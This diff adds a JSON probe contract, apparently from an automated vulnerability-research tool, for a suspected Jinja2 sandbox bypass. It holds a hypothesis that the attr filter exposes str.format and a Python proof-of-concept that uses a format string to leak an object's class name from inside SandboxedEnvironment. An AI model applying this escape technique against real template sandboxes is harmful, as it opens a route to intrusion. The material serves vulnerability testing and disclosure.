@@ -1,0 +1,14 @@
+{
+  "contract_version": "corsair-lite/differential-probe/2",
+  "hypothesis": {
+    "target_file": "jinja2/filters.py",
+    "target_symbol": "do_attr",
+    "target_lines": [
+      1433
+    ],
+    "root_cause": "do_attr obtains a Python attribute directly and only checks the resulting object, bypassing the sandbox environment lookup that applies special handling to string formatting methods.",
+    "expected_violation": "the sandboxed attr filter returns a callable string formatter that reveals an owned object type"
+  },
+  "build_script": "cat > /tmp/corsair-jinja-requirements.lock <<'EOF'\nMarkupSafe==3.0.3 \\\n    --hash=sha256:d6dd0be5b5b189d31db7cda48b91d7e0a9795f31430b7f271219ab30f1d3ac9d\nEOF\npython -m pip install --disable-pip-version-check --only-binary=:all: --no-deps --require-hashes -r /tmp/corsair-jinja-requirements.lock",
+  "probe": "from jinja2.exceptions import SecurityError\nfrom jinja2.filters import do_attr\nfrom jinja2.sandbox import SandboxedEnvironment\n\nCONTROL_PAYLOAD = \"upper\"\nEXPLOIT_PAYLOAD = \"format\"\n\n\nclass OwnedToken:\n    pass\n\n\ndef run_target(payload: str) -> bool:\n    environment = SandboxedEnvironment()\n    if payload == CONTROL_PAYLOAD:\n        return do_attr(environment, \"corsair\", payload)() == \"CORSAIR\"\n    try:\n        value = do_attr(environment, \"{0.__class__.__name__}\", payload)(OwnedToken())\n    except SecurityError:\n        return True\n    return value != \"OwnedToken\"\n"
+}
